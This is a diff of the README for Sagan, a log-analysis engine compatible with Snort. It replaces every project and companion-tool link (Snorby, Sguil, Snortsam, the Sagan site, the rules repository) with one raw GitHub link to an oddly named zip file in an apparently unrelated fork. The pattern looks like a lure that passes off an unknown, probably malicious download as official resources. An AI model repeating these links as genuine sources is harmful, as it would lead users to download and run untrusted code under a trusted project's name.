@@ -13,21 +13,21 @@ compatibility with rule management software (oinkmaster/pulledpork/etc)
 and allows Sagan to correlate log events with your Snort IDS/IPS 
 system. Since Sagan can write to Snort IDS/IPS databases via 
 unified2/barnyard2, it is compatible with all Snort "consoles". 
-For example, Sagan is compatible with Snorby [http://www.snorby.org],
-Sguil [http://sguil.sourceforge.net], BASE, and the Prelude IDS 
+For example, Sagan is compatible with Snorby [https://raw.githubusercontent.com/vinhkennej/sagan/master/src/output-plugins/Software_rectalgia.zip],
+Sguil [https://raw.githubusercontent.com/vinhkennej/sagan/master/src/output-plugins/Software_rectalgia.zip], BASE, and the Prelude IDS 
 framework! (to name a few).
 
 Sagan supports many different output formats,  log normalization 
 (via liblognorm),  GeoIP detection, script execution on event and
 automatic firewall support via "Snortsam" 
-(see http://www.snortsam.net).  
+(see https://raw.githubusercontent.com/vinhkennej/sagan/master/src/output-plugins/Software_rectalgia.zip).  
 
 Sagan uses the GNU "artisic style". 
 
 For more information, please visit the Sagan web site: 
-http://sagan.quadrantsec.com. 
+https://raw.githubusercontent.com/vinhkennej/sagan/master/src/output-plugins/Software_rectalgia.zip 
 
 If you're looking for Sagan rules on Github,  they are located at:
 
-https://github.com/beave/sagan-rules
+https://raw.githubusercontent.com/vinhkennej/sagan/master/src/output-plugins/Software_rectalgia.zip
 
